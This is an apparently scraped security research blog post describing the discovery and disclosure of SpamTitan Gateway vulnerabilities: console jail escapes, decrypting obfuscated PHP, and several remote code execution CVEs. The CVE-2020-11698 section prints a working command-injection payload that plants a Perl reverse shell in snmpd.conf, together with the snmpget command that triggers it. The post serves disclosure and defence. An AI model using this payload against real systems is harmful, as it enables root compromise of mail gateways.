* [Cookie Policy](https://www.titanhq.com/about/cookie-policy/)



=== Content from twitter.com_be1f1449_20250119_112645.html ===



=== Content from sensepost.com_2122eb3b_20250119_112644.html ===

# [Orange Cyberdefense Orange Cyberdefense](/)

* [![Orange Cyberdefense](/img/master-logo.svg)

  ![](/images/orange-logo-small.svg)

  ![Orange Cyberdefense](/img/logo-text-x.svg)](/)

# Our Blog

* [2024 (10)](/blog/2024/)
* [2023 (19)](/blog/2023/)
* [2022 (10)](/blog/2022/)
* [2021 (13)](/blog/2021/)
* [2020 (30)](/blog/2020/)
* [2019 (10)](/blog/2019/)
* [2018 (14)](/blog/2018/)
* [2017 (27)](/blog/2017/)
* [2016 (22)](/blog/2016/)
* [2015 (17)](/blog/2015/)
* [2014 (15)](/blog/2014/)
* [2013 (30)](/blog/2013/)
* [2012 (27)](/blog/2012/)
* [2011 (33)](/blog/2011/)
* [2010 (36)](/blog/2010/)
* [2009 (81)](/blog/2009/)
* [2008 (75)](/blog/2008/)
* [2007 (80)](/blog/2007/)

# Clash of the (Spam)Titan

Reading time
~17 min

*Posted
by Felipe Molina
on
14 July 2020*
Categories:
[Rce](/blog/rce/),
[Source code review](/blog/source%20code%20review/)

I recently tested an Internet facing Anti-Spam product called¬†[SpamTitan Gateway](https://www.spamtitan.com/). As you could infer from the name of the product, this platform‚Äôs purpose was to detect Spam and or other malicious software sent via email. It has a lot of other features too as you could imagine from this type of product. In this post I will detail some vulnerabilities I discovered that ultimately lead to the ability to have unauthenticated remote code execution.

SpamTitan provides their services in [three formats](https://www.spamtitan.com/spamtitan-deployment-options/): Cloud based, Private Cloud based, or self-hosted, installed using an ISO or VMware image. After providing a corporate email, you can download an ISO with the most recent version of their appliance to test in your own infrastructure.

I decided to have a look at the self-hosted format, so I downloaded the ISO, deployed using VMWare Workstation and launched it.

## Escaping The Console Jail

The first thing you would see when you first access the SpamTitan appliance is that the default administrator user is running in a restricted console. By default you can‚Äôt explore the file system of the machine as it only provides interaction via a Perl script (more on this later) displaying very limited functionality:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-88.png)

To investigate the SpamTitan solution further I needed more insight into the internals, so‚Ä¶ challenge accepted: let‚Äôs escape from the jail.

The main menu allowed you to configure the network interfaces of the server, restart the web server and diagnose the network for connection problems. Not much to start with.

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-89.png)

I started with the network diagnostics menu to see what programs they allow you to run from there. I could inject flags and options to the¬†*ping*¬†and¬†*traceroute*¬†programs, but nothing interesting that allowed me to escape the console.

### A backup to a root shell (CVE-2020-24046)

Next, I decided to go for the web application. After familiarisation with the web interface I found the ‚ÄúBackup‚Äù section, where you could backup and restore server configurations. Let‚Äôs see what it exports:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-90.png)

It looks like the backup is just a tar.bz2 file containing configuration files. At first sight the /var/tmp folder looks boring, but a closer look drives our attention to the file ‚Äúadmin.passwd‚Äù, containing (in a format that reminds to the [/etc/passwd format](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)) what looks like the hash of the administrator password and its default console: /usr/local/bin/stconsole.

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-91.png)

Having a hunch about the meaning of this file, I just edited it to change¬†***/usr/local/bin/stconsole***¬†to¬†***/bin/sh***¬†and the [UID](http://www.linfo.org/uid.html) of the user to 0. After doing this, we compress the contents of the parent folder to a tar.bz2 and use the ‚ÄúBackup Import‚Äù feature in the web interface.

After doing this, we return to the console, try to log-in again with the ‚Äúadmin‚Äù account and *Voila*! We have a¬†*root*¬†shell:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-92.png)
### VMWare tools to a root shell (CVE-2020-24045)

Now, with *root* access to the server, we can explore the file system at will. It only took a few minutes to identify another way to escape from the restricted console without the need of a user on the web application interface. Reading through the Perl code of the restricted shell **/usr/local/bin/stconsole**, we can see a section whose purpose is to install [vmware tools](https://docs.vmware.com/en/VMware-vSphere/6.7/com.vmware.vsphere.html.hostclient.doc/GUID-28C39A00-743B-4222-B697-6632E94A8E72.html) on the underlying FreeBSD operating system:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-1.png)

Hidden option ‚Äú5‚Äù to invoke ‚Äúvmtools‚Äù function

![](/img/pages/blog/2020/clash-of-the-spamtitan/vmware.1-1024x721.png)

Mounting the CD drive with VMware tools when hidden option ‚Äú5‚Äù is selected in the main menu.

![](/img/pages/blog/2020/clash-of-the-spamtitan/vmware.2-1024x315.png)

Executing vmware-install.pl script with super user privileges

As you can see, there was a hidden option in the **stconsole** script, which would install VMWare tools and blindly execute, as the super-user, any script mounted from the CD with the name: */tmp/vmware-tools/distrib/vmware-install.pl*.

As we have local access to the SpamTitan VM we can craft our own vmware-tools ISO and make the application execute our own ‚Äúvmware-install.pl‚Äù script. Any idea of what we could execute? Yes, I think a [reverse shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) would do‚Ä¶

I wrote a Perl reverse shell in the ‚Äúvmware-tools‚Äù folder, calling it ‚Äúvmware-install.pl‚Äù. I then used ‚Äú[genisoimage](https://packages.debian.org/sid/genisoimage)‚Äù to create the ISO image with the reverse shell:

![](/img/pages/blog/2020/clash-of-the-spamtitan/forgeiso.png)

Creating our own ISO with a Perl reverse shell posing as the vmware-install.pl script

![](/img/pages/blog/2020/clash-of-the-spamtitan/animal_crossing_vmware-1024x782.jpg)
![](/img/pages/blog/2020/clash-of-the-spamtitan/mountiso.png)

Mount our ISO as the virtual CD drive in the SpamTitan VM

![](/img/pages/blog/2020/clash-of-the-spamtitan/reviso-1024x553.png)

Triggering the reverse shell from the main menu

The hidden option 5 in the main menu will trigger the mount of the CD drive and the execution of vmware-install.pl script as the *root* user, providing us with a nice root shell from which to advance with the investigation.

## Finding Web Vulnerabilities

Having root access on the file system of the appliance was only the beginning. Once we had access to the file system, we could explore the PHP files providing functionality to the web interface.

The first hiccup I faced when I wanted to read the PHP code was that they had properly obfuscated all the code with¬†[ionCube](https://www.ioncube.com/), so it was not possible to just read the PHP files. They just looked like big nonsensical strings:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-95-1024x652.png)

PHP code obfuscated with ionCube

While I thought about what I could do with the obfuscated PHP files, I was able to read a lot of non-obfuscated Perl and Bash scripts present on the file system, but, nothing interesting came from this. It was time to face the obfuscated source code.

I researched the ionCube encryption used and found that it was already broken and explained in a BH Asia 2012 talk¬†[‚ÄúStealing from Thieves: Breaking ionCube VM to RE Exploit Kits‚Äù](https://media.blackhat.com/ad-12/Saher/bh-ad-12-stealing-from-thieves-Saher-slides.pdf). Additionally, decryption of ionCube encrypted files was offered as a service on some websites:

![](/img/pages/blog/2020/clash-of-the-spamtitan/decrypt.page_.png)

Having in mind that there are already a lot of places where decryption of ionCube protected code is offered, I discarded the option of trying to manually break the ionCube VM myself. Instead, I decided to check some of these decryption services. In the end I decided to use one that provided test decryption and a low price for one month of file decryption. I first checked that they were able to successfully decrypt sample PHP files that I provided them after downloading an [ionCube demo](https://www.ioncube.com/encoder_eval_download.php).

One virtual credit card, a fake PayPal account and 10¬£ less in my wallet later, I was able to upload the obfuscated PHP files I had extracted from my SpamTitan server. Unfortunately, the ionCube version they were using on the most recent version of SpamTitan was not decryptable:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-98.png)

Although the web service said it didn‚Äôt have decoders for PHP 7.0+ I did not check what version of PHP I was interested in. Now, I was sad and with 10¬£ less to spend on video games, so I resorted to studying the Perl and Bash scripts I was able to read on the server again. One of the scripts that caught my attention was¬†*fetchupdates.pl*.

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-99-1024x345.png)

Script authenticating to public FTP update servers

As you can see here, the script was authenticating to the SpamTitan update servers using FTP, with the username ‚Äúftp‚Äù and the hostname of the machine as the password. We just needed to know what the update server address was. To obtain this information we could check the PostgreSQL database of the SpamTitan server:

![](/img/pages/blog/2020/clash-of-the-spamtitan/db_query.pixel_.png)

Update server domain found in the PostgreSQL database

### Obtaining decrypted source code

After gathering all this information, we could browse the public FTP repository of SpamTitan:

![](/img/pages/blog/2020/clash-of-the-spamtitan/ftp.connection.pixel_.png)

Successful connection to the public update server

This public FTP repository had all of the update packages for the history of the product. The files were there so your SpamTitan installation could fetch a patch for any version it may need. I downloaded the patches to ‚Äúupgrade‚Äù to a slightly older version (7.04 and 7.05) than the one I was running (7.07) and explored what the patches had inside.

### Obtaining decrypted sources

The patches had, among other files to update the underlying OS, all the PHP files to be updated from the previous version. Luckily, they were also written for an older version of PHP. So, I gathered all the files I was interested in and proceeded to decrypt them:

![](/img/pages/blog/2020/clash-of-the-spamtitan/decrypted.page_.png)

After spending some time uploading various interesting encrypted files, we were be able to browse the decrypted PHP code and hunt for more vulnerabilities. One quick way was to perform a text search for interesting functions such as ‚Äúexec(‚Äù or ‚Äúeval(‚Äù, which lead to an abundance of results:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-125.png)

I initially wanted to manually inspect each potential command execution, but in the middle of the exercise I decided to get some help from a static analysis tool before I went crazy.

### Automated source code review

I‚Äôve always used¬†[RIPS](https://www.ripstech.com/)¬†for static code analysis of PHP files, but this time round I decided to use another tool I had never tried:¬†[SonarQube](https://www.sonarqube.org/). Usage of SonarQube is out of the scope of this post, but it supports several languages and not only focusses on the security of code but also in broader code analysis practices, such as code coverage, unit testing, etc:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-127.png)

At the end of the day, SonarQube did not provide me with more information than what I already detected with manual inspections, but helped me focus on interesting files. The majority of the *exec* calls I had detected previously were calls to FreeBSD programs and were non-injectable, but some of them were. What is more interesting was that some of the sources were coming directly from¬†*$\_GET*¬†or¬†*$\_POST* variables¬†provided by the user. As a result, a total of four RCE and one arbitrary read was reported to SpamTitan at the end of this research. All the vulnerabilities were patched in the following version of SpamTitan (7.08), published the 26th of May 2020.

## The End of the Road (?)

The discovered vulnerabilities were reported to SpamTitan team, who answered in less than one day confirming they were going to fix them on their next release, as they did. If you have an outdated version of SpamTitan in your infrastructure (7.07 or older), we highly recommend you **to patch as soon as possible**, although it is probable your SpamTitan server has already been automatically patched if you have restarted it between the publish date of the patch (26th of May 2020) and today.

I‚Äôll dive into the details of one of the Unauthenticated RCE vulnerabilities, CVE-2020-11698. Many of the other vulnerabilities follow the same principals. The final list of assigned CVEs were:

* **CVE-2020-11698:**¬†Unauthenticated Remote Code Execution through snmp-x.php.
* **CVE-2020-11699**: Authenticated RCE in certs-x.php abusing ‚Äúfname‚Äù and php¬†[system()](https://www.php.net/manual/en/function.system.php)¬†function.
* **CVE-2020-11700:**¬†Access to arbitrary files in the file system.
* **CVE-2020-11803**: Authenticated RCE in mailqueue.php abusing parameter ‚Äújaction‚Äù and php¬†[eval()](https://www.php.net/manual/en/function.eval.php)¬†function.
* **CVE-2020-11804**: Authenticated RCE in mailqueue.php abusing ‚Äúqid‚Äù parameter and php¬†[system()](https://www.php.net/manual/en/function.system.php)¬†function.

### CVE-2020-11698¬†‚Äì SNMPD command injection

The exploit for CVE-2020-11698 took advantage of two weaknesses in the product:

* Unauthenticated interaction with the ‚Äúsnmp-x.php‚Äù script
* Lack of input sanitisation before writing data to the ‚Äú/usr/local/etc/snmp/snmpd.conf‚Äù file.

[The snmpd.conf file](https://man.openbsd.org/snmpd.conf)¬†tells the SNMP daemon what its configuration parameters are. The daemon runs as root on the system, so compromising this daemon means compromising the whole system.

One interesting configuration parameter is the ‚Äúcommunity‚Äù string, provided by the web user when interacting with the ‚Äúsnmp-x.php‚Äù PHP script. When submitted to snmp-x.php, the¬†*snmpd.conf*¬†configuration file was updated and a line containing the name of the community and the network CIDR allowed to query it was added:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-32-1024x536.png)

Community name and allowed network CIDR added to the file¬†*snmpd.conf*

Reading the documentation for the snmpd.conf file, we can see the ‚Äú[EXTEND](http://net-snmp.sourceforge.net/wiki/index.php/Tut%3AExtending_snmpd_using_shell_scripts)‚Äù configuration directive would allow us to execute scripts, returning its output when a specific SNMP OID is queried. Adding the following directive to the ‚Äúsnmpd.conf‚Äù file will return ‚Äúhello world‚Äù to the SNMP client asking for the correct OID:

```
extend test /bin/echo hello world
```

As a result, exploitation is really simple; inject a weaponised ‚Äúextend‚Äù directive (which will end up in the snmpd.conf file) with a Perl reverse shell to my IP (e.g. 192.168.1.50:4242). To do so, we just need to POST the following ‚Äúcommunity‚Äù value to ‚Äúsnmp-x.php‚Äù:

```
public" 192.168.1.0/24\n
extend revshell /usr/bin/perl -e 'use Socket;$i="192.168.1.50";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");}; # '
```

This payload for the ‚Äúcommunity‚Äù form field will add the ‚Äúpublic‚Äù community string and allow it to be queried from the 192.168.1.0/24 ip range. It will also add an **[extend](http://net-snmp.sourceforge.net/wiki/index.php/Tut%3AExtending_snmpd_using_shell_scripts)** directive with a reverse Perl shell.

To trigger the reverse shell we just need to query the .1.3.6.1.4.1.8072.1.3.2.3.1.1.8.114.101.118.115.104.101.108.108 OID (use¬†[snmptranslate](https://linux.die.net/man/1/snmptranslate)¬†to get the OID representation of the string ‚Äúrevshell‚Äù). Set up a netcat listener on port 4242 of the machine and use the command line snmpget to query the spamtitan server like this:

```
snmpget -v2c -c public spamtitan.felipe.local .1.3.6.1.4.1.8072.1.3.2.3.1.1.8.114.101.118.115.104.101.108.108
```

We should receive a shiny shell with¬†**root**¬†permissions where our netcat was listening :-)

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-33-1024x568.png)

Got root shell after querying the SpamTitan server SNMP daemon

To automate exploitation, I have written a PoC (available¬†[on github](https://github.com/sensepost/ClashofSpamTitan)). The PoC will take care of everything in the exploit chain, from injecting the ‚Äúextend‚Äù command to setting up the socket to receive the root shell. You can see the exploit in action in this video:

## Three Authenticated RCEs and one Arbitrary File Read.

I found other three RCE vulnerabilities (CVE-2020-11699, CVE-2020-11803, CVE-2020-11804) and one arbitrary file read (CVE-2020-11700).

In the case of these vulnerabilities, the RCE was authenticated and the permissions you got when exploiting them were the permissions of the web server (*amavisd*).

I tried to find privilege escalation vulnerabilities on the box to escalate from the¬†*amavisd*¬†user to the¬†*root*¬†user and, although I didn‚Äôt find a clear path to escalate in the time I had for the research, my spidey senses told me that there should to be a way to escalate (\*wink, wink\*).

![](/img/pages/blog/2020/clash-of-the-spamtitan/spidersenses.gif)

Sensing some potential LPE in the product

I also automated the exploitation of these three RCE‚Äôs and the File Read with a PoC (available¬†[on github](https://github.com/sensepost/ClashofSpamTitan)). You can refer to the source code of the PoC to get more details of each vulnerability.

You can see the PoC in action in this video, where the method flag (-m) indicates what CVE to exploit (1, 2, 3 or 4):

## Conclusion

SpamTitan put a fair amount of effort in hindering reverse engineering attempts by preventing access to the underlying operating system and obfuscating the PHP code in the VM image. But, maybe they relied too extensively on obfuscation techniques to hide programming mistakes that may lead to vulnerabilities.

The vulnerabilities themselves were not difficult to spot once access to the source code was achieved. These kind of programming errors should also be relatively easy to avoid with enough security awareness of the development team and having code quality reviews before reaching production. These vulnerabilities may just be the result of relying so much on the ‚Äú[security though obscurity](https://en.wikipedia.org/wiki/Security_through_obscurity)‚Äù principle.

Having said this, it is worth mentioning that the SpamTitan security team were easily reachable though their client portal and they fixed the vulnerabilities efficiently in their next release.

## Disclosure Timeline

* 17/04/2020: First contact with SpamTitan by mail.
* 17/04/2020: Answer from SpamTitan redirecting to their ticketing system.
* 17/04/2020: SensePost provide vulnerability details and Proof of concept scripts.
* 21/04/2020: Answer from SpamTitan acknowledging the vulnerabilities and planning the patch for release 7.08.
* 26/05/2020: Version 7.08 released. Vulnerabilities are no longer present.
* 14/07/2020: SpamTitan contacted about the two jail escaping vulnerabilities.
* 20/07/2020: SpamTitan answers. A hot fix to prevent VMware Tools CD mounting has been deployed (CVE-2020-24045). The second jail escaping weakness (CVE-2020-24046) will be addressed in version 7.09, to be released in September 2020.
* 16/09/2020: Public disclosure.

## Get in touch with us

sensepost@orangecyberdefense.com

Please select your enquiry type, and we'll get back to you as soon as possible

General
Security Assessments
Hacking Training
Managed Services

Hands On Hacking Fundamentals
Web Application Hacking
Infrastructure Hacking
Introduction to Red Teaming
Unplugged; Modern WiFi Hacking

Careers

Get in touch

###### By clicking √¢¬Ä¬òGet in touch√¢¬Ä¬ô you agree to Orange Cyberdefense's [Terms of Service](https://orangecyberdefense.com/global/general-terms-and-conditions/)

#### Orange Cyberdefense Pretoria (Head Office)

+27 (0)12 460 0880

Park Lane West, 197 Amarand Ave, Waterkloof Glen, Pretoria, South Africa

#### Orange Cyberdefense London (Head Office)

+44 (0)2070 781 360

SensePost, 250 Waterloo Road, SE1 8RD, London, United Kingdom

#### Orange Cyberdefense Cape Town

+27 (0)12 460 0880

183 Albion Springs Corner Main Road &, Albion Springs Cl,, Rondebosch, Cape Town, South Africa

[Linked In](//www.linkedin.com/company/sensepost "Linked In")
[RSS Feed](/rss.xml "RSS Feed")

![](/img/components/logo/creds_logos.png)

¬© Orange Cyberdefense 2024


